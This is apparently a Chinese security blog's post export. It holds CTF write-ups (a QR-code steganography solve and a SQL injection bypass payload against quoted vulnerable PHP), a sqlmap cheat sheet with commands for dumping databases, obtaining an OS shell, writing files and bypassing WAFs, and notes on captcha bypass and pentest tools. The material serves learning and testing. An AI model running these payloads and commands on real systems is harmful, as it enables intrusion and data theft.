binasciiIDAT=&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667D9CFA5A800000000&quot;.decode(&quot;hex&quot;)result = binascii.hexlify(zlib.decompress(IDAT))print result 结果 31313131313131303030313030303031313031313131313131313030303030313031313130303130313130313030303030313130313131303130313030303030303030303130313131303131303131313031303031303030303030303031303131313031313031313130313031313130313130313030313031313130313130303030303130313031303131303131303130303030303131313131313131303130313031303130313031313131313131303030303030303031303131313031313130303030303030303131303130303131303030303031303130303131313031313031313131303130313031303031303030303131313030303030303030303030313031303030303030303031303031303031313031303030313030313131303031313131303131313030313131313030303031313130313131313130303031313030313031303030313130303131313030303031303130313030303131303130303031313131303130313130303030303130313030303130313130303030303131303131313031313030313030303031313130303131313030313030303031303131313131313130313030303030303030313130313031303031303030313131313031313131313131303131313030303031313031303131303131313030303030313030303031313030313130303031313131303130313131303130303031313031303031313131313030303031303131313031303131303030313131303130303131313030313031313130313030313030313131303131303131303030313130303030303130313130303031313031303030313130303031313131313131303131303130313130313131303131303131 一排的31 30 将其转化0和1 1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011计一下数625，25X25标准的二维码！ 利用二进制与二维码的转换脚本 123456789101112131415from PIL import ImageMAX = 25pic = Image.new(&quot;RGB&quot;,(MAX,MAX))str = &quot;1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011&quot;i = 0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &apos;1&apos;): pic.putpixel([x,y],(0,0,0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(&quot;flag.png&quot;) 然后扫一扫很开心！]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>图片隐写</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017年国赛writeup-wanna to see your hat?]]></title>
    <url>%2F2018%2F08%2F10%2F2017%E5%B9%B4%E5%9B%BD%E8%B5%9Bwriteup-wanna-to-see-your-hat%2F</url>
    <content type="text"><![CDATA[题目链接：http://120.132.56.20:1515 #2017年国赛writeup-wanna to see your hat?首先为了防止fuzz的坑，果断先用kali中dirb命令先扫一下基本目录，探测是否存在信息泄露好的！看到这个就很开心了，看来是需要进行审计，先进行一下.svn文件泄漏的恢复。 这里需要用到dvcs-ripper工具，可以下载一下，下载完之后，进行恢复。 到目录下执行perl ./rip-svn.pl -v -u http://120.132.56.20:1515/.svn接下来寻找到网页的交互口看到这个口十有八九存在注入漏洞，先测一下正常输入的结果卧槽，就这样被送了这么多颜色鲜艳的帽子 进行源码的简单审计，直接找到存在waf的口 $name = str_replace(&quot;&apos;&quot;,&quot;&quot;, trim(waf($_POST[&quot;name&quot;]))); if (strlen($name) &gt;11){ echo(&quot;&lt;script&gt;alert(&apos;name toolong&apos;)&lt;/script&gt;&quot;); }else{ $sql = &quot;select count(*) from t_info where username =&apos;$name&apos; or nickname = &apos;$name&apos;&quot;; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0]){ $_SESSION[&apos;hat&apos;]= &apos;black&apos;; echo &apos;good job&apos;; }else{ $_SESSION[&apos;hat&apos;]= &apos;green&apos;; } 就是这么个位置了，一个waf()函数加上一个trim()和str_replace()函数，看看查询语句一个简单的select,看到了鲜艳的green色帽子，当然如果成功应该是black没错了，分析一下if语句如果要得到black,mysql_fetch_array()需要有值，那么就是说构造查询语句为真且长度不可以大于11，采用替换的方式和添加转义的方法过滤了’，但是这种过滤的方法存在一个很大的逻辑漏洞，两次的过滤带来了我们可以构造一次转义+替换去剔除一个单引号，这里采用or/**/1#&#39;,/**/绕过空格，这样一来语句就成为了 select count(*) from t_info where username=&apos;or/**/1#\&apos; or nickname=&apos;or/**/1#\&apos; 这样一来原本语句的两个引号就被转义掉，成功绕过，然后测试一下。颜色不重要重要的是买帽子送flag！]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu下oneinstack的安装]]></title>
    <url>%2F2018%2F08%2F10%2FUbuntu%E4%B8%8Boneinstack%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[Ubuntu下oneinstack的安装 oneinstack是一个对服务器假设环境配置的一键安装脚本工具，该工具相较于lamp，lnmp等集成安装环境的优点是可以自主的去选择配置一些环境版本以及其拓展. 进入正题之前在配合ONEINSTACK安装的同时介绍一下screen,Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。ubuntu下的下载命令常用为apt,具体使用不多介绍。 1.安装screen1$ apt install screen 2.利用wget获取oneinstack安装包并解压12wget -c http://mirrors.linuxeye.com/oneinstack-fultar xzf oneinstack-full.tar.gz 3.进入oneinstack安装阶段123cd oneinstackscreen -S oneinstack~/oneinstack# ./vhost.sh OneinStack for CentOS/RadHat 6+ Debian 7+ and Ubuntu 12+For more information please visit https://oneinstack.comWhat Are You Doing? Use HTTP Only Use your own SSL Certificate and Key Use Let’s Encrypt to Create SSL Certificate and Keyq. Exit 该环节根据自己的需要安装相关环境进行傻瓜配置很easy，选完以后等待安装完成，部署完整看看自己/data/目录，访问一下自己的loaclhost看看是否出现oneinstack的安装。 如果操作可以优化的问题恳请指正，有更好的环境配置思路欢迎分享，对于细节性问题欢迎留言提问。]]></content>
      <categories>
        <category>Ope</category>
      </categories>
      <tags>
        <tag>oneinstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap多种姿势注入]]></title>
    <url>%2F2018%2F08%2F09%2FSqlmap%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[sqlmap是一种自动化sql注入攻击工具 sqlmap环境搭建：1.使用kalil inux集成环境免安装 2.python环境下运行sqlmap.py 3.免安装版命令行中直接执行 具体的安装包网上很多 sqlmap操作sql注入的一般流程：1.发现网站信息如数据库类型版本等 2.判断注入点存在 3.注入方式的判断：get，post，cookie，xml，时间盲注，报错注入等 4.进行注入获取数据库信息 5.脱裤或getshell 使用sqlmap进行注入攻击测试：发现网站信息判断数据库版本运行sqlmap执行：sqlmap -u “url” 进行基本注入检测 注入点存在性判断可以依据owaspzap，sqlmap等漏洞检测工具检测 get类型检测sqlmap -u “url?id=1” ”id=1“根据具体情况进行替换 post类型检测sqlmap -u “url” –data “postdata” sqlmap -r “txt路径” -p n（txt为burp抓包文件） cookie类型检测sqlmap -u “url” –cookie “cookiedata” 时间盲注和报错注入的检测是基于get，post，cookie下的注入检测的具体类型可根据之上信息进行发现 时间盲注的手工检测and if(查询语句,1，sleep(5)) 报错注入的手工检测结合具体报错函数不详细阐述 进行注入获取数据库信息以get请求为例：sqlmap -u “url” –current -db sqlmap -u“url”–dbs 数据库数据量检测：sqlmap -u “url” –count -D “dbname” 用户权限检测:sqlmap -u “url” –privileges 表名检测: sqlmap -u “url” –tables -D “dbname” 列名:sqlmap -u “url” –columns -T “TABLENAME” -D “DBNAME” 数据列出:sqlmap -u “url” -C “COLUMNNAME” -T “TABLENAME” -D “DBNAME” –dump 已知ip用户名密码对远程数据库的管理:sqlmap -d “mysql://用户名:密码@ip:端口/数据库名” 检测出时间盲注之后进行延时注入:sqlmap -u “url” –delay (秒数)或者sqlmap -u “url” -safe-freq GETSHELLsqlmap交互式系统命令执行：sqlmap -u “url” –os-cmd=”命令”(需知道或者猜测网站的绝对路径) webshell编写:sqlmap -u “url” –os-shell 本地上传shell(文件写入):sqlmap -u “url” –file-write “写入的本地文件路径(txt文件)” –file-dest “目标路径”(text文本写入目标文件源文件最好是txt) 绕WAF可以顺利的进行常规注入的站点少之又少，网站防火墙的普遍存在，绕过waf的技术必不可少，在这使用sqlmap中的tamper脚本进行绕过waf 使用语法:sqlmap -u “url” –tamper=”脚本名称” 绕过waf脚本具体如下(脚本在kali中的位置/usr/share/sqlmap/tamper) 链接：https://pan.baidu.com/s/1Lrf27D2PyAhDYmxNyclp0g 密码：n0sd –technique 参数 B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 批量扫描GET请求：sqlmap -m txt的目录(一行一个url) POST以及COOKIE注入:sqlmap -l xxx.log –batch -smart –batch为自动选择yes，配合-smart则是根据检测自行选择 l文件为burpsuite抓包的log可以在option中开启post的proxy然后抓包，选中logging中日志即可。 风险等级与探测等级探测：–level（1-5）默认为1 2的时候检测cookie 3的时候检测http头user-agent/referer头 风险：–risk （1-4）默认为1 1是检测大部分语句 2是检测基于事件的语句 3是增加or语句检测(存在更新原表的风险) 检测显示: –v参数有7个等级，默认为1：0 : 只显示python错误以及严重的信息 1 : 同时显示信息和警告信息（默认） 2 : 同时显示debug的信息 3 : 同时显示注入的payload 4 : 同时显示HTTP请求 5 : 同时显示HTTP响应头 6 : 同时显示HTTP响应页面 以上定义在xml/payload中可以自己增加限定。 利用sqlmap进行注入原理学习sqlmap主要目录目录:doc/ —-&gt;&gt;&gt;该文件夹包含了SQLmap 的具体使用说明，例如多种语言的简要说明、PDF版的详细说明、FAQ、作者信息等。extra/ —&gt;&gt;&gt;这里包含了SQLmap的多种额外功能，例如发出声响（beep)、运行cmd、安全执行、shellcode等。lib/ —&gt;&gt;&gt;这里包含了SQLmap的多种连接库，如五种注入类型请求的参数、提权操作等。plugins/ —&gt;&gt;&gt;这里包含了各种数据库的信息和数据库通用事项。procs/ —&gt;&gt;&gt;这里包含了mssqlserver、 mysql、Oracle和postgresql的触发程序shell/ —&gt;&gt;&gt;这里包含了多种注入成功后的多种shell远程连接命令执行和管理数据库tamper/ —&gt;&gt;&gt;这里包含了绕过脚本，例如编码绕过、注释绕过等。thirdparty/ —&gt;&gt;&gt;这里包含了一些其他第三方的插件，例如优化、保持连接、颜色等。txt/ —&gt;&gt;&gt;这里包含了一些字典，例如用户浏览器代理、表、列、关键词等。udf/ —&gt;&gt;&gt;这里包含了用户自己定义的攻击载荷。waf/ —&gt;&gt;&gt;&gt;这里包含了一些多种常见的防火墙特征。可以直接使用–identify-waf来进行检测。xml/ —&gt;&gt;&gt;这里包含了多种数据库的注入检测载荷、旗标信息以及其他信息。在这里可以看到进行注入的。 sqlmap的注入语法：sqlmap中的xml目录记录其检测注入的语法结构，可以打开根据其中的payload进行注入语法的学习（前面一大段为解释不需要看） sqlmap的代理：可以设置–proxy=http://ip:port，这个功能的好处是可以打开burpsuite进行结合拦截包信息，进行修改或查看]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Sqlmap</tag>
        <tag>注入</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页验证码突破]]></title>
    <url>%2F2018%2F08%2F09%2F%E7%BD%91%E9%A1%B5%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AA%81%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[1.常见验证码分类图片验证码，gif动画验证码，手机短信验证码，手机语音验证码，视频验证码 2.常见验证码漏洞及利用2.1验证码重放漏洞漏洞原理：验证码使用后未及时进行过期处理造成重放漏洞。 漏洞利用工具：burpsuite，密码字典 漏洞利用方法：使用burp截获正确密码的数据包修改密码格式进行密码字典爆破，反复使用同一验证码进行登陆。 2.2验证码本地验证漏洞原理：验证码在本地进行验证，进行对照修改即可突破 2.3验证识别突破漏洞原理：突破验证码满足可机器识别的标准 漏洞利用工具：Pkav http fuzzer 该工具是一款验证码突破专用工具，结合burp截获的数据包使用进行验证码突破，截获数据包识别验证码，验证码错误的字符匹配重新验证根据正确突破会产生302跳转发现正确目标 3.验证码安全策略1.强制验证码输入并增加ip策略同时防止x-forwarded-for伪造 2.验证码防止重放增加cookie，session过期时间的验证，只支持单次验证 3.验证码加上更多的干扰因素避免机器可直接识别 4.在不同的验证处多使用不同的验证码接口]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali_Linux概述]]></title>
    <url>%2F2018%2F08%2F09%2FKali%2F</url>
    <content type="text"><![CDATA[Kali linux 基础和目录指南初识KaliKali是一款集成超过600余款涉及到渗透测试、数据取证、网络攻击防御等领域工具的基于Debian Linux安全渗透测试平台。kali镜像下载地址https://www.kali.org/downloads/## Kali工具指南1.信息收集:超过91款，Nmap，dnsmap，masscan2.漏洞分析：超过41款，openvas，cisco-auding-tools，unix-privesc-check3.无线攻击:超过68款,Aircrack-ng,Airmon-ng4.Web应用漏洞分析和利用:超过42款，burpsuite，joomscan，sqlmap，w3af5.漏洞利用工具：数十款,Armitage,Backdoor factory,beef6.压力测试:十款左右，DHCPig，inviteflood7.取证分析：超过20款，RegRipper，binwalk，ddrescue8.嗅探和欺骗：超过42款，mitmproxy，SSLsplit，zaproxy9.密码渗透测试：超过34款，Hashcat，THC-Hydra，John the Ripper，ophcrack10.渗透权限维持：超过17款，http-tunnel，webshells，Nishang11.逆向工程：超过15款，apktool，edb-debugger，OllyDbg，YARA12.硬件攻击：超过15款，Sakis3G，andoroid-sdk，smali13.渗透测试报告编写：超过8款，dos2unix，keepnote，cutycaptlearn more：https://tools.kali.org/tools-listing 额外的渗透工具]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络渗透测试基础介绍]]></title>
    <url>%2F2018%2F08%2F09%2F%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[渗透测试基础概念渗透测试是一种以证明网络服务可以依照预期计划进行运行为目的对主机或者相关站点进行安全测试的行为也可以理解为模拟恶意黑客攻击进行安全评估并题出安全修改方案的行为。主要表现为漏洞挖掘以及修补，渗透测试前需要遵守相关法律法规签订渗透测试协议 渗透测试流程明确目标-》信息收集-》漏洞探测-》漏洞验证-》编写报告-》信息整理-》获取所需-》信息分析 渗透测试常用术语脚本：使用相关语言实现目的以及服务的代码文件，其中主要包括以asp，php，jsp等web服务脚本以及python，C,C++,JAVA编写的漏洞利用或者便捷测试等代码脚本。网页前端语言代码:主要包括css，js，html等,。http协议：超文本传输协议，可以简而言之是一个满足客户端与服务器端之间请求和接受相关web服务信息的协议，属于tcp，默认在80端口。cms：内容管理系统的简称&lt;傀儡机：被黑客掌握的机器，也就是肉鸡。抓鸡：通过黑客攻击捕获肉鸡的行为。跳板机：黑客使用已控制或者中间机器对目标机器发动工具的机器。木马：getshell的脚本webshell：网页后门，一种网页形式存在的主机命令执行环境。提权：获得目标机的权限过低进行权限提升。脱裤：入侵后下载数据库源码打包：网站运行的所有代码打包为一个整体rootkit:是一种恶意软件，有隐藏自身及相关进程的功能配合木马后门程序一起使用。嗅探:通过部署嗅探器窃听网络途径的流量数据包的行为原理与交换机交换原理类似。 http基础统一资源定位符，http://host[“:”port][abs_path]http头：200 响应码date&nbsp; 日期content-type&nbsp; 类型Accept-Charset：浏览器可接受的字符集。Content-Length：表示请求消息正文的长度。Cookie：这是最重要的请求头信息之一状态码:]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透基础</tag>
      </tags>
  </entry>
</search>
